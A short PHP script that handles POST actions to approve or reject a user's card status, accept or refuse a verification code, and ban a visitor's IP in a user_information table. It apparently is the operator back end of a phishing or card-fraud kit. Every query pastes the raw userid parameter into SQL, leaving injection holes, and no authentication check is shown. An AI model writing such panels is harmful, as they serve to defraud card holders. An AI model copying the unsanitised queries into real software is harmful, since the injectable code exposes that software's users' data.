<?php
require_once 'config.php';


function release_user() {

}

function banip() {

}


function letgo() {

}

function refill() {

}

function refuse() {

}

if($_POST['action'] == "release"){
    
    // RELEASE
    if(isset($_POST['cardstatus'])){
        
        $sql = "UPDATE user_information SET cardstatus='approve', prompt_status=1 WHERE id='".$_POST['userid']."'";

        $result = mysqli_query($conn, $sql);
        
        echo 1;
    }else{
        if($_POST['userid']){
            $sql = "UPDATE user_information SET verificcode='1' WHERE id='".$_POST['userid']."'";

            $result = mysqli_query($conn, $sql);
            echo 1;
        }
    }
}

if (isset($_POST['action']) AND $_POST['action'] == "banip") {
    if ($_POST['userid']) {
        $sql = "SELECT ipaddress, banstatus FROM user_information WHERE id=" . $_POST['userid'];
        if ($result = mysqli_query($conn, $sql)) {
            while ($row = mysqli_fetch_array($result)) {
                if (!$row['banstatus']) {
                    if ($row['ipaddress']) {
                        ban_ip($row['ipaddress']);
                        $sql = "UPDATE `user_information` SET banstatus=1 WHERE id='" . $_POST['userid'] . "'";
                        $result = mysqli_query($conn, $sql);
                        echo 1;
                    }
                }
            }
        }
    }
}


if ($_POST['action'] == "refuse") {

    // REFUSE
    if(isset($_POST['cardstatus'])){

        $sql = "UPDATE user_information SET cardstatus='reject', prompt_status=2 WHERE id='".$_POST['userid']."'";

        $result = mysqli_query($conn, $sql);

        echo 1;

    }else{
        if($_POST['userid']){
            $sql = "UPDATE user_information SET verificcode='2', code='' WHERE id='".$_POST['userid']."'";

            $result = mysqli_query($conn, $sql);
            echo 1;
        }
    }
}

